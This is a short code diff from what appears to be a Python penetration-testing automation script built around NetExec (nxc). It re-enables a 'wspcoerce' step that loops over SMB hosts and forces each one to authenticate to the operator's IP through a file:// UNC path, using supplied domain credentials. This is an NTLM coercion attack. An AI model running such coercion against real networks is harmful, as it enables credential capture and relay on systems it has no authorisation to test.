@@ -31,7 +31,7 @@ def run_nxc_creds_checks(args):
         scan.run_nxc_ssh,
         scan.run_nxc_smb_enum,
         scan.run_nxc_ldap_enum,
-        #scan.wspcoerce << put this back once testing in kali
+        scan.wspcoerce
     ]
     commands.threaded_functions(args, cmds)
     check_nxc_smb_vulns()
@@ -174,8 +174,8 @@ def run_nxc_ldap_enum(args):
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def wspcoerce(args):
-    ip = general.get_local_ip_auto()
-    smb_proc = commands.start_background_tools()
+    ip = general.get_local_ip()
+    #smb_proc = commands.start_background_tools() <<not working
     with open("Hosts/smbHosts.txt", 'r') as file:
         for line in file:
             target = line.strip()
@@ -185,4 +185,4 @@ def wspcoerce(args):
             cmd = f"wspcoerce '{args.domain}/{args.domain_user}:{args.domain_pass}@{target}' \"file:////{ip}/share\""
             commands.single_command(cmd, line, "bright-green")
     
-    commands.stop_background_tools(smb_proc)
+    #commands.stop_background_tools(smb_proc)
